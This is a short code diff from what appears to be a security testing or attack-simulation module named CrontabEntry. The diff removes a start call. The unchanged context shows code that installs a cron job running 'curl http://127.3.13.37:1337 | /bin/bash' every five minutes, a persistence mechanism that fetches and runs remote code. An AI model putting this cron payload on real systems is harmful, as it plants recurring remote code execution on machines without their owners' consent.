@@ -13,7 +13,6 @@ class CrontabEntry(ModuleBase):
         return 60 * 60  # 1 hour
 
     def do_run(self):
-        self.start()
         import time
         from subprocess import Popen, PIPE
         job = r'echo "*/5 * * * * /bin/bash -c \"curl http://127.3.13.37:1337 | /bin/bash\" ### {0}"'.format(self._banner)
